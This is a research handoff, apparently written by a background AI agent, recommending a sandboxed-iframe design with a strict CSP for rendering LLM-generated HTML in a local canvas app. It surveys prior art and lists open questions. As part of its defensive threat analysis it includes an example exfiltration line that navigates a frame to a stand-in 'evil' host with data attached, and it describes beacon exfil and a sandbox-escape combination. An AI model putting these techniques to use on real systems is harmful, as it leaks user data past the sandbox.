# HANDOFF: safe-llm-html-rendering research (for the coordinating session)

Companion to [`safe-llm-html-rendering.md`](./safe-llm-html-rendering.md). Written 2026-07-14 by a background research agent running in parallel with other sessions.

## TL;DR recommendation

Keep ADR 0002's posture as the default — Component Artifacts (structured JSON drawn by the trusted vocabulary) plus free-form SVG under Image Isolation are the two safest rungs on the ladder, and the research validates them rather than revising them. If the pilot gallery ever proves the free-form-HTML need, fill the labeled slot with a **sandboxed iframe + header-delivered CSP + MessageChannel bridge** (served token-free from a second 127.0.0.1 port for a distinct origin), and never with sanitize-into-host-DOM: DOMPurify's own threat model disclaims exfil protection, mXSS bypasses recur yearly against it, and a bypass would execute in the Canvas origin next to the capability token. `src/sanitizer/` should stay empty.

## Decision-relevant findings

1. **Sandbox ≠ containment without CSP.** An opaque-origin (`sandbox` without `allow-same-origin`) iframe still has full network: `fetch()` in `no-cors` mode and `<img>` beacons deliver one-way exfil regardless of CORS. Only `default-src 'none'; connect-src 'none'`-class CSP closes it — and that CSP must be an HTTP **header**, because the CSP3 spec ignores `sandbox`, `frame-ancestors`, and `report-uri` in `<meta>` delivery. The repo's existing HTTP server makes header delivery easy — a structural advantage over srcdoc.
2. **One exfil channel cannot be closed on the open web platform:** a sandboxed document may always navigate *itself* (`location = "https://evil/?d=..."`, or a user link-click), and the CSP `navigate-to` directive was removed from the spec in 2022 without ever shipping. Any script-enabled hatch carries this residual; only data-starving the frame or a non-browser wrapper (Electron `will-navigate`) mitigates it.
3. **`allow-scripts` + `allow-same-origin` is a spec-documented total escape** (frame removes its own sandbox attribute and reloads). Must be structurally impossible, not linted.
4. **Prior art converges exactly on the recommended shape.** VS Code (per-webview `vscode-webview://` origin + `default-src 'none'` CSP + postMessage), Observable (per-user `observableusercontent.com` sandbox iframe), Claude Code artifacts (`*.claudeusercontent.com` + CSP blocking all external requests incl. fetch/XHR/WebSocket), ChatGPT Apps (`web-sandbox.oaiusercontent.com` + strict CSP). Nobody sanitizes-and-executes in the host DOM; Jupyter, which renders into its own DOM, forbids scripts entirely.
5. **Messaging boundary specifics:** an opaque origin serializes as `"null"`, so host→frame postMessage needs `targetOrigin "*"` and `event.origin` is useless for auth — identity comes from `event.source === iframe.contentWindow` plus a transferred `MessageChannel` port; schema-validate everything, closed verb set, capability token never crosses the bridge. The native Sanitizer API is not Baseline as of mid-2026 (Safari missing) — not a dependency option regardless.

## Open questions for the decision-maker

- Is network access ever grantable to a frame (OpenAI-style consented per-artifact allowlist) or always proxied host-side over the bridge (recommended)?
- Second-port serving vs same-port path: accept the second listener's costs (lifecycle, macOS firewall prompt) for the origin split? Does the frame route need its own capability token, or is an unguessable artifact ID enough given the routes are token-free by design?
- Accept the permanent navigation-exfil residual of a plain browser tab, or revisit a wrapper (tension with ADR 0001)?
- Empirically test whether `<meta http-equiv=refresh>` fires inside a sandboxed frame (spec ambiguous; unverified) — strip it in the shell either way.
- Who owns the ratchet on Component Vocabulary growth and URL-protocol allowlists in components?

## Repo state observed

Snapshot 2026-07-14 18:30 MDT (other sessions active in parallel; state may have moved): branch `main`, HEAD `415731f` "docs: record human verification of M1 manual criteria (issue 06)". Load-bearing files consulted: `docs/adr/0002-no-freeform-html-in-v1.md` (the slot this research fills), `docs/adr/0005-capability-url-for-all-canvas-endpoints.md`, `docs/adr/0010-askback-is-the-only-door.md`, `docs/research/local-canvas-landscape.md` (convention + prior-art overlap), `CONTEXT.md` (vocabulary: Image Isolation, Component Artifact), `src/server/http.ts` (CSP header already sent), `src/canvas/components/document.ts` (textContent-only rendering), `src/sanitizer/` (empty placeholder). Untracked `.claude/` worktrees present from other agents.

## Sync note

**Nothing was committed.** This agent wrote exactly two files — `docs/research/safe-llm-html-rendering.md` and this handoff — and ran no mutating git commands. The main session decides how/whether to sync them in.
